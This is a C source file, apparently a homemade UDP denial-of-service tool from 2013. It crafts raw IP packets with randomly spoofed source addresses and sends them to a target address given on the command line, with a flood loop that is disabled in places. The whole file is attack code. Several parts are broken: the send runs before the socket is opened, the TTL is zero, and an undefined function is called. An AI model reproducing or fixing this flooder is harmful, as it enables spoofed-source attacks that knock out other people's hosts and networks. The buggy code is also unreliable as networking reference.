/*date: 2013-10-29
 *author: shenya
	*/
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <signal.h>
#include <pthread.h>
#include <netinet/udp.h>

uint8_t *hostname = NULL;
static unsigned long dest = 0;
static int rawsock;
int alive = 1;

int32_t icmp_cksum(void *data, int length)
{
	int left = length;
	uint16_t *wd = (uint16_t *)data;
	int sum = 0;
	uint16_t temp;

	while(left > 1)
	{
		sum += *wd++;
		left -= 2;
	}
	if(left == 1)
	{
		*((uint8_t *)(&temp)) = *((uint8_t *)wd);
		sum += temp;
	}
	
	sum = (sum >> 16) + (sum&0xffff);
	sum += (sum >> 16);

	temp = ~sum;

	return temp;
}
 
int32_t cksum_add(void *data, int length)
{
	int left = length;
	uint16_t *wd = (uint16_t *)data;
	int sum = 0;
	uint16_t temp;

	while(left > 1)
	{
		sum += *wd++;
		left -= 2;
	}
	if(left == 1)
	{
		*((uint8_t *)(&temp)) = *((uint8_t *)wd);
		sum += temp;
	}
	

	temp = sum;

	return temp;
}
 
static long int ip_random(void)
{
	long int random_ip;
	
	srand(time(0));

	random_ip = random();

	return random_ip;
}
 uint32_t pseudo_checksum(struct ip *iph, int length)
{
	int checksum = 0;
	int leng = 72;

	uint16_t temp_protocol, temp_length;
	temp_protocol = htons(iph->ip_p);
	temp_length = htons(ntohs(iph->ip_len) - iph->ip_hl*4);

	checksum += cksum_add(&(iph->ip_src), sizeof(uint32_t) );
	checksum += cksum_add(&(iph->ip_dst), sizeof(uint32_t));
	checksum += cksum_add(&temp_protocol, sizeof(uint16_t));
	checksum += cksum_add(&temp_length, sizeof(uint16_t));

	return checksum;


}

uint16_t checksum_finish(uint32_t temp_sum)
{
	while(temp_sum > 0xffff)
		temp_sum = (temp_sum >> 16) + (temp_sum & 0xffff);
	temp_sum = (~temp_sum) & 0xffff;

	return temp_sum;
}
static void Dos_udp(void)
{
	struct sockaddr_in to;
	struct in_addr addr_temp;

	struct ip *iph;
	struct udphdr *udph;
	char *packet;
	int pktsize = sizeof(struct ip) + sizeof(struct udphdr) +64;

	printf("pktsize is %d, udphdr leng: %d\n", pktsize, sizeof(struct udphdr));

	packet = malloc(pktsize);
	if(packet == NULL)
	{
		perror("fail to malloc");
		exit(1);
	}
	printf("1\n");
	iph = (struct ip *)packet;
	udph = (struct udphdr *)(packet + sizeof(struct ip));

	memset(packet, 0, pktsize);

	iph->ip_v = 4;
	iph->ip_hl = 5;
	iph->ip_tos = 0;
	iph->ip_len = htons(pktsize);
	iph->ip_id = htons(getpid());
	printf("2\n");
	iph->ip_off = 0;
	iph->ip_ttl = 0x0;
	iph->ip_p = IPPROTO_UDP;
	iph->ip_sum = 0;
	addr_temp.s_addr = ip_random();
	iph->ip_src = addr_temp;
	addr_temp.s_addr = dest;
	iph->ip_dst = addr_temp;

	iph->ip_sum = icmp_cksum(iph, 20);

	udph->source = htons(52000);
	udph->dest = htons(51000);
	udph->len = htons(64+8);
//	uint32_t temp = pseudo_checksum(iph, 0) + cksum_add(udph, 64+8) ;
	//udph->check = checksum_finish(temp);
	udph->check = 0;
	udph->check = icmp_cksum(udph, 8);

	printf("3\n");
	to.sin_family = AF_INET;
	to.sin_addr.s_addr = iph->ip_dst.s_addr;
	to.sin_port = htons(0);

	sendto(rawsock, packet, pktsize, 0, (struct sockaddr *)&to, sizeof(struct sockaddr));
	

	free(packet);
}

static void *
Dos_fun(void *arg)
{
	while(alive)
	{
					Dos_udp();
	}
}


int main(int argc, char *argv[])
{
	struct hostent *host = NULL;
	struct protoent *protocol = NULL;		
	char protoname[] = "icmp";
	pthread_t tid;



	Dos_udp();
#if 0
	if(argc < 2)
	{
		printf("ping aaa.bbb.ccc.ddd\n");
		exit(1);
	}
#endif



	protocol = getprotobyname(protoname);
	if(protocol == NULL)
	{
		printf("fail: not support icmp\n");
		exit(1);
	}

	memset(&dest, 0, sizeof(dest));
	hostname = argv[1];

	dest = inet_addr(hostname);
#if 0
	else
	{

		host = gethostbyname(hostname);
		if(host == NULL)
		{
			printf("fail to gthostbyname");
			exit(1);
		}
		
	//	printf("addr is %s\n", inet_ntoa(*((struct in_addr *)host->h_addr)));
		memcpy((char *)&dest.sin_addr, host->h_addr, host->h_length);
		memcpy(dest_str, inet_ntoa(*((struct in_addr *)host->h_addr)), strlen(inet_ntoa(*((struct in_addr *)host->h_addr))));
#endif
	
	rawsock = socket(AF_INET, SOCK_RAW, protocol->p_proto);
	if(rawsock < 0)
	{
		perror("fail to socket");
		exit(1);
	}

	setsockopt(rawsock, SOL_IP, IP_HDRINCL, "1", sizeof("1"));
	
#if 0
	pthread_create(&tid, NULL, Dos_fun, NULL);
	Dos_icmp();
#endif
	Dos_udp();
	while(1);


	return 0;

}
